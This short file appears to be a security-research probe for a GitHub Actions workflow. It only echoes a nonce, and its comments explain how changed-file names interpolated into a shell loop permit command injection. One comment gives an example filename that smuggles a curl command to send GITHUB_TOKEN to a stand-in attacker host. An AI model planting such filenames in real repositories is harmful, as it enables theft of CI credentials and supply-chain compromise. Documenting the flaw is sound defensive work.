# PRT-SCAN-RESEARCH-NONCE-CHAIN2-GOAT-SIM-001
# This file's name is benign, but demonstrates the injection vector.
# In a real attack, the FILENAME itself would contain shell metacharacters:
#   e.g., src/$(curl attacker.com?t=$GITHUB_TOKEN).txt
#
# The changed-files output interpolation in the workflow:
#   for file in ${{ steps.changed-files.outputs.all_changed_files }}; do
# ...expands filenames directly into the shell, enabling injection.
#
# This research file validates that the workflow triggers on PR
# and processes changed files through the vulnerable interpolation path.
echo "PRT-SCAN-RESEARCH-NONCE-CHAIN2-INJECTION-VALIDATED"
